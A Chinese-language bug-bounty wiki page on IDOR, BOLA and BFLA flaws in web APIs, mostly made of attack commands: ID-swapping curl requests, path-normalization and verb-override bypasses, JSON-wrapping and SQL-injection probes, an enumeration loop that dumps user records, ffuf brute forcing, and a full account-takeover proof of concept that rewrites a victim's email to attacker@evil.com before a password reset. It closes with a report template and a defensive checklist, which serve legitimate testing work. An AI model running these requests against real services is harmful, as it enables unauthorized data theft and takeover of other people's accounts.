---
type: wiki
category: attack
tool: burp,autorize,manual
status: active
last-updated: 2026-04-21
---

# IDOR / BOLA / BFLA 深度（2026 版）

> **用途：** OWASP API Top 10 2023 的 #1 (BOLA) + #5 (BFLA) 是大獎穩定來源。IDOR 寫入 = P1-P2、讀取 = P2-P3。UUID predictability / GraphQL batch / mass enum 是常見升級點。

## 0. 名詞

| 術語 | 全名 | 意義 |
|------|------|------|
| IDOR | Insecure Direct Object Reference | 直接物件參照未驗 owner |
| BOLA | Broken Object Level Authorization | OWASP API #1：`id=` 換了直接拿別人資料 |
| BFLA | Broken Function Level Authorization | OWASP API #5：user 能呼叫 admin 功能 |
| BOPLA | Broken Object Property Level Auth | OWASP API #3：user 能改不該改的 field（等價 mass assignment）|

## 1. 找 IDOR 候選

### 1.1 任何帶 ID 的 endpoint

```
GET    /api/users/{id}
GET    /api/orders/{id}
PATCH  /api/users/{id}/email
DELETE /api/posts/{id}
POST   /api/teams/{id}/invite
GET    /api/files/{uuid}
GET    /download?file=123
GET    /export?report=5
```

### 1.2 ID 可能藏在

```
Path: /api/users/5
Query: ?id=5 &user=5 &uid=5
Body (JSON/form): {"id":5}
Header: X-User-Id: 5, Authorization 中的 JWT sub
Cookie: user_id=5
GraphQL variables
```

### 1.3 找「本人」endpoint

```
GET /me  → returns {id:42, ...}
GET /my/orders
GET /profile

# 用 /me 知道自己 ID = 42，再試別人 ID
```

## 2. ID 型別與繞法

### 2.1 整數（最好打）

```bash
# 自己 ID 42，試 41, 43
curl -H "Auth: Bearer $TOKEN" /api/users/41
# 200 + 別人資料 → IDOR
```

### 2.2 UUID — 不好猜但也有 exploit

**UUID v1 可預測**（時間戳 + MAC）：

```bash
# 取 2 個 UUIDv1
curl /api/orders → uuid1: d9428888-122b-11e1-b85c-61cd3cbb3210
curl /api/orders → uuid2: d94291e0-122b-11e1-b85c-61cd3cbb3210

# 時間戳段 d9428888 vs d94291e0 → 差距可計算
# 用 uuid-rs https://crates.io/crates/uuid 或：
python -c "import uuid; u=uuid.UUID('d9428888-...'); print(u.time)"

# 可 brute 中間值
```

**UUID v4（真隨機）— 繞法**：

1. **搜集洩漏的 UUID**（email 中、shared link、log、old endpoint 回傳他人 UUID）
2. **API 回傳 UUID list**（GET /api/users 回 [{id:uuid},...]，配 BFLA）
3. **透過其他 endpoint 間接查詢**（GET /users?email=victim@x.com → return UUID）

### 2.3 Hash-based ID（base64 / hex）

```
/files/aHR0cHM6Ly94
# base64 decode → https://x → 直接改
```

### 2.4 Encrypted ID（需找 oracle）

若 ID 是 AES-CTR 加密 + 沒 HMAC → 逐 byte flip 攻擊（極少見，但有案例）。

## 3. BOLA 具體攻法

### 3.1 GET — 讀他人資料

```bash
curl -H "Auth: Bearer $MY_TOKEN" /api/users/VICTIM_ID
# 若 200 + 資料 → IDOR read
```

### 3.2 PATCH / PUT — 改他人資料

```bash
curl -X PATCH -H "Auth: Bearer $MY_TOKEN" /api/users/VICTIM_ID \
  -d '{"email":"attacker@evil.com"}'
# → 改 victim email → ATO
```

### 3.3 DELETE — 刪他人資料

```bash
curl -X DELETE -H "Auth: Bearer $MY_TOKEN" /api/orders/VICTIM_ORDER
```

### 3.4 Action endpoint

```
POST /api/users/5/disable-2fa      → 關別人 2FA
POST /api/teams/5/remove-member/7  → 踢別人
POST /api/invite/accept?token=...  → 奇怪 token 驗證
```

## 4. BFLA（function-level）

### 4.1 用 user token 呼叫 admin endpoint

```bash
# Admin 才有的
curl -H "Auth: Bearer $MY_USER_TOKEN" /api/admin/users
curl -H "Auth: Bearer $MY_USER_TOKEN" -X POST /api/admin/settings \
  -d '{"maintenance":true}'

# 若 200 → BFLA
```

### 4.2 Method tampering

```bash
# App 只允許 GET /orders/5 for owner
# 但 PATCH /orders/5 沒 check

curl -X PATCH /api/orders/5 -d '{"status":"refunded"}'
```

### 4.3 HTTP verb smuggling

```
X-HTTP-Method-Override: DELETE
_method=DELETE （form）
OPTIONS / HEAD / TRACE bypass
```

### 4.4 Path normalization

```
/admin/users/..;/users/5              # Tomcat
/admin/users/%2e%2e/users/5           # Nginx
//admin//users/5                      # 雙 slash
```

## 5. Advanced IDOR

### 5.1 Array / JSON wrapping

```json
// 正常
{"user_id": 42}

// Array（某些 parser 取第一個，某些取最後一個）
{"user_id": [42, 999]}

// 包 object
{"user_id": {"id": 42}}    # 若 server cast → "[object Object]"
{"user_id": "42', 1)--"}   # 同時試 SQLi
```

### 5.2 Wildcard / negative

```
/api/users/*
/api/users/-1
/api/users/0
/api/users/%00
/api/users/all
/api/users/.json   # 某些 framework 回整個表
```

### 5.3 Parameter pollution

```
?user_id=42&user_id=99
# 詳見 [69-mass-assignment-hpp.md]
```

### 5.4 GraphQL alias batching

```graphql
query {
  u1: user(id: 1) { email }
  u2: user(id: 2) { email }
  u3: user(id: 3) { email }
  # ... 100+ alias
}
```

見 [17-graphql-deep-attacks.md](17-graphql-deep-attacks.md)。

### 5.5 GraphQL `node` interface

Relay-style：`node(id: "...")` 能查任何 type，多半忽略 authz。

### 5.6 Path-level IDOR via UUID reuse

```
# /api/projects/{PROJ_UUID}/tasks/{TASK_ID}
# 若 server 只 check TASK owner 而非 PROJ 內 task → cross-project IDOR

curl /api/projects/MY_PROJ_UUID/tasks/VICTIM_TASK_ID
# 可能 200
```

### 5.7 File ID（signed URL）

```
/download?file=abc&sig=HMAC

# 擷取 abc → 換成 victim file name，sig 失效
# 但若 sig 只 sign timestamp 不 sign file name → 可繞
```

## 6. Mass Enumeration（讀一堆 IDOR → 大影響）

### 6.1 整數序列

```bash
for i in {1..10000}; do
  curl -s -H "Auth: Bearer $T" /api/users/$i >> dump.json
  sleep 0.1
done
```

**不要 abuse** — PoC 停在證明「有 IDOR + 隨機 3 ID 驗證」即可。完整 dump 會被判 harmful。

### 6.2 GraphQL batch

```graphql
# 一次 1000 alias = 1 request → rate limit 幾乎無感
```

### 6.3 UUID v1 time attack

```python
# 抓一個已知 UUID v1
# 計算前後 ms 的 UUID
# brute search
```

## 7. 偵測工具

### 7.1 Autorize (Burp extension)

```
1. 登入 user A，browser 操作整個 app
2. Burp → Autorize extension → 設 user B 的 cookie
3. Autorize 對每個 request replay with user B cookie
4. 看哪些「Bypass！」（user B 拿到 A 的資料）
```

### 7.2 AuthMatrix (Burp extension)

階層化：guest / user / moderator / admin，自動測跨層 BFLA。

### 7.3 Caido + Automate

類似 Autorize。

### 7.4 ffuf（ID brute）

```bash
ffuf -u 'https://target.com/api/users/FUZZ' \
  -w <(seq 1 10000) \
  -H "Auth: Bearer $T" -mc 200 -fs 42
```

### 7.5 Nuclei

```bash
nuclei -u https://target.com -tags idor
# 有 generic IDOR template
```

## 8. 完整 PoC：PATCH /api/users/{id}/email → ATO

### Step 1: Setup 兩個帳號

```
Alice ID=42, token=AT
Bob   ID=43, token=BT
```

### Step 2: 試 BOLA write

```bash
curl -X PATCH https://target.com/api/users/43/email \
  -H "Authorization: Bearer $AT" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com"}'

# Response: 200 {"id":43,"email":"attacker@evil.com"}
# → Bob 的 email 被 Alice 改掉
```

### Step 3: Password reset 鏈到 ATO

```bash
# Attacker 去 target.com 做 forgot password 流程
curl -X POST https://target.com/api/forgot-password \
  -d '{"email":"attacker@evil.com"}'

# Attacker 收到 reset link → 重設 Bob 密碼 → 完整 ATO
```

### Step 4: 報告

```markdown
## 漏洞概述
PATCH https://target.com/api/users/{id}/email 僅驗證 caller 身份，
未檢查 URL 中 {id} 是否等於 caller 的 user_id，任一登入使用者可改其他
使用者 email，進一步透過 password reset 達成完整 ATO。

## PoC
[Alice token + PATCH Bob's email → Bob email changed → Attacker reset Bob's password]

## Impact
- 任意帳號接管（只要知道 victim user_id，多數 app 可從 /users/search 或 email 回推）
- 不需 victim 互動

## Severity
P1 / Critical

## 修補
1. PATCH handler 強制檢查 `req.params.id === req.user.id` 或 admin
2. Rails: `before_action :check_owner`
3. 所有 object-level 操作走統一 authz middleware
4. 敏感 field（email/phone/password）改 email 時要 re-auth + email 確認
```

## 9. 防禦 checklist

```
1. 每個 resource endpoint 都做 ownership check
   - 自寫 `authorize` middleware
   - Rails: `Pundit` / `CanCanCan`
   - Django: `rest_framework.permissions`
   - Spring: `@PreAuthorize("#id == principal.id")`
2. 用 GUID v4 而非整數自增
3. 敏感 field 改動需 step-up auth
4. Admin endpoint 走不同 path + middleware（/admin vs /api）
5. Log 所有 authz failure → alert
6. GraphQL 每個 resolver 都做 authz check，不依賴 root 層
7. 業務物件 ID 永遠驗證歸屬，不信 client
8. 邏輯 enum：rate limit + anomaly detection
```

## 關聯文件

- [17-graphql-deep-attacks.md](17-graphql-deep-attacks.md) — GraphQL alias batch IDOR
- [65-csrf-deep.md](65-csrf-deep.md) — 配 CSRF 做 IDOR write
- [69-mass-assignment-hpp.md](69-mass-assignment-hpp.md) — BOPLA（mass assignment）
- OWASP API Security Top 10 2023：https://owasp.org/API-Security/editions/2023/en/0x11-t10/
- PortSwigger IDOR：https://portswigger.net/web-security/access-control/idor
- Autorize：https://github.com/PortSwigger/autorize
